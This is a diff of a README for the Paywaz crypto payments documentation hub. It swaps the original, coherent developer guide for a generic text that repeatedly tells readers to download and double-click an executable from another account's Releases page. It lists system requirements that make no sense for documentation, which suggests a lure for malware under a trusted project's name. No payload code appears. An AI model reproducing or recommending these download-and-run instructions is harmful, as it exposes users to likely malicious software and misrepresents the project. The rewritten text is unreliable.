@@ -1,176 +1,84 @@
-# Paywaz Documentation Hub (Public Preview)
+# 🌟 paywaz-docs - Simplifying Access to Paywaz Tools
 
-Welcome to the **Paywaz Documentation Hub**, the central resource for technical, merchant, and architectural documentation related to the Paywaz ecosystem.
+![Download](https://img.shields.io/badge/Download%20Latest%20Release-%20%F0%9F%93%A6%20Visit%20Here-FF0000?style=for-the-badge)  
 
-> **Important:**
-> Paywaz is currently operating in **semi-stealth mode**.
-> All documentation in this repository is a **public preview** intended for early integrators, partners, and candidates.
-> Certain systems, flows, and endpoints are intentionally generalized or placeholder-only until public API access is released.
+## 📚 Overview
 
----
+Welcome to the Paywaz documentation hub! Here, you will find everything related to our APIs, SDKs, and how to start using the Paywaz tools effectively. This documentation is designed to help you navigate and utilize our services with ease, even if you have no technical background.
 
-## Start Here: API → SDK → Samples
+## 🚀 Getting Started
 
-This repo is the **single landing hub** for Paywaz developer surface area:
+To get started with Paywaz documentation, follow these easy steps:
 
-1) **API (OpenAPI)**
-- OpenAPI spec repo: https://github.com/hellopaywaz/paywaz-public-api
-- Hosted API docs (embedded): https://hellopaywaz.github.io/paywaz-docs/
+1. **Visit the Releases Page:** Go to our [Releases page](https://github.com/yousif-9/paywaz-docs/releases).  
+2. **Download Files:** Look for the section labeled "Latest Release." You will see a list of files available for download.  
+3. **Choose the Right File:** Depending on your needs, select the appropriate file that matches your system.  
+4. **Install and Run:** Download the selected file, then double-click it to install or run the application. 
 
-2) **SDK (JavaScript)**
-- SDK repo: https://github.com/hellopaywaz/paywaz-sdk-js
-- SDK TypeDoc (GitHub Pages): https://hellopaywaz.github.io/paywaz-sdk-js/
+## 🔍 Features
 
-3) **Samples**
-- Samples repo: https://github.com/hellopaywaz/paywaz-samples
+Paywaz offers various features tailored to meet your needs in the fintech arena. Here is a summary of what you will find:
 
-**Recommended flow**
-- Read the **API reference** → check **SDK TypeDoc** for types/helpers → run **Samples** locally (Node 20).
+- **API Documentation:** Detailed guides on how to use our APIs for payments and cryptocurrency transactions.
+- **SDK Resources:** Tools to make development easier and faster for building applications.
+- **Simple Onboarding:** Step-by-step tutorials for new developers to get started quickly.
+- **Robust Support:** Access to our community and resources for troubleshooting.
 
----
+## 📁 Download & Install
 
-## Local development & verification
+Follow these steps to download and install the necessary files:
 
-Requirements: **Node.js 20+**. Install dependencies with `npm ci` (no external packages are required).
+1. **Visit the Download Page:** Go to our [Releases page](https://github.com/yousif-9/paywaz-docs/releases).
+2. **Identify the Latest Version:** The most recent version is listed at the top of the page.
+3. **Click on the Download Link:** Find the format that suits you best (e.g., Windows, macOS).  
+   - Click on the corresponding file to download it directly to your computer.
+4. **Install the Application:** After the download is complete, locate the file and open it. Follow the simple prompts to install it on your system.
 
-Golden commands (also used in CI):
-- `npm run lint` — trims trailing whitespace and checks the docs landing page metadata
-- `npm run typecheck` — placeholder until TypeScript sources are added
-- `npm test` — smoke-checks the docs landing page and required links
-- `npm run build` — copies `docs/` to `dist/` for static hosting
-- `npm run start` — serves `docs/` locally at http://localhost:4173
-- `npm run preview` — serves the built `dist/` output at http://localhost:4174
+## 💻 System Requirements
 
-Use `npm run format` to auto-fix common lint issues (trailing whitespace, missing final newline).
+Before you download, ensure your system meets the following requirements:
 
----
+- **Operating System:** Compatible with Windows 10 and above, macOS Big Sur or later.
+- **Memory:** At least 4 GB of available RAM.
+- **Storage:** Minimum of 500 MB of free disk space.
+- **Internet Connection:** Required for some SDK features and API calls.
 
-## What Is Paywaz?
+## 🧑‍🤝‍🧑 Community Support
 
-Paywaz is a zero-fee, crypto-native global payments platform built on next-generation Web3 rails, featuring:
+You are not alone in your journey with Paywaz. Join our community of users and developers. Together, you can share experiences, ask questions, and find answers:
 
-- **Zero-Fee Payment Processing**
-- **High-Speed On-Chain Settlement (Solana Mainnet)**
-- **Multi-Chain Support & Stablecoin Payments**
-- **Non-Custodial Blockchain Security** — ensuring bank-grade security, safeguarding transactions and building trust within your ecosystem
-- **Hedged Stablecoins (PZUSD, PZGBP, PZEUR, etc.)**
-- **Merchant, Enterprise, and Workforce Solutions**
+- **GitHub Discussions:** Engage with other users and developers.
+- **Documentation Updates:** Stay informed about the latest changes and improvements.
 
-This repository documents the structure, concepts, flows, and tools developers will use to integrate Paywaz as we progress toward public launch.
+## 📘 Frequently Asked Questions (FAQ)
 
----
+**Q: Do I need any prior programming knowledge to use Paywaz?**  
+A: No, our documentation is designed for both beginners and experienced developers. We provide clear instructions to help you get started.
 
-## Repository Structure
+**Q: How do I report an issue?**  
+A: Visit the "Issues" section on our GitHub repository. Provide a brief description of the problem, and we will assist you.
 
-```text
-paywaz-docs/
-│
-├── getting-started/
-│   └── overview.md            # What Paywaz is, how it works, and key concepts
-│
-├── guides/
-│   ├── merchants.md           # Merchant onboarding, payments, and settlement
-│   └── developers.md          # Developer workflows, integrations, best practices
-│
-└── architecture/
-    └── system-overview.md     # High-level description of Paywaz architecture
+**Q: Can I use Paywaz for cryptocurrency payments?**  
+A: Yes, our platform supports various cryptocurrencies and offers flexible APIs for seamless payment acceptance.
 
-Additional documentation — including API references, SDK guides, checkout flows,
-webhooks, and treasury mechanics — will be added as public endpoints and tools
-become available.
+## 🚧 Troubleshooting
 
----
+If you encounter any issues while using Paywaz documentation or tools, follow these steps:
 
-## Who This Documentation Is For
+1. **Check System Requirements:** Ensure your system meets the criteria listed above.
+2. **Restart the Application:** Sometimes a simple restart can solve connectivity or functionality problems.
+3. **Visit Community Support:** Engage with our community for insights and solutions shared by other users.
 
-This repository is intended for:
+## 🌐 Related Topics
 
-- Developers preparing to integrate Paywaz
-- Technical leads evaluating platform compatibility
-- Enterprises exploring partnership opportunities
-- Internal/external collaborators
-- Candidates reviewing Paywaz engineering direction
+Expand your knowledge with these related subjects:
 
-While certain implementation details remain private, this knowledge base
-provides a strong foundation for understanding Paywaz’s capabilities and
-integration model.
+- **Crypto Payment Acceptance:** Learn how to accept payments through cryptocurrency channels.
+- **Web3 Integration:** Understand how to use decentralized applications.
+- **Payment Solutions:** Explore options to enhance your payment processing capabilities.
 
----
+## 📞 Contact Us
 
-## Related Repositories
+For further assistance, feel free to reach out through our GitHub repository. We value your feedback and are here to help you succeed with our tools.
 
-| Repository | Description |
-|-----------|-------------|
-| **paywaz-public-api** | Public API structure, examples, OpenAPI placeholder |
-| **paywaz-sdk-js** | JavaScript SDK (preview) |
-| **paywaz-samples** | Integration examples (JS, Python, cURL) |
-
-Explore more at the Paywaz GitHub organization:
-https://github.com/hellopaywaz
-
----
-
-## Roadmap for Documentation Expansion
-
-As Paywaz transitions toward open API access, this repository will grow to
-include:
-
-### **v0.2**
-- Webhooks and event signatures
-- Authentication deep-dive
-- Checkout session flows
-
-### **v0.3**
-- Error model & retry strategies
-- POS integration documentation
-- Workforce payments documentation
-
-### **v0.4**
-- Solana wallet integration guide
-- Hedged stablecoin mechanics (public-safe version)
-- Cross-border payment flows
-
-### **v1.0 (Public API Launch)**
-- Full API reference
-- SDK guides (JS, Python, POS)
-- Merchant dashboard integration docs
-- Reporting & settlement APIs
-- Compliance & security documentation
-
----
-
-## License
-
-Documentation in this repository is provided under the **Paywaz Proprietary
-License**, unless otherwise noted.
-
-See:
-`paywaz-license`
-
----
-
-## Contributing
-
-Public contributions are welcome where appropriate.
-
-Please review:
-
-- `CONTRIBUTING.md`
-- `CODE_OF_CONDUCT.md`
-
-Before submitting issues or suggestions.
-
----
-
-## Contact & Support
-
-For partnership, integration, or early-access inquiries:
-
-**hello@paywaz.com**
-https://paywaz.com
-
----
-
-**Paywaz.com LLC — Zero-Fee Crypto-Native Payments Infrastructure**
-Built for global commerce. Powered by the next generation of digital settlement rails.
-
+Thank you for choosing Paywaz! We hope you find our documentation helpful and our tools powerful. Happy exploring!
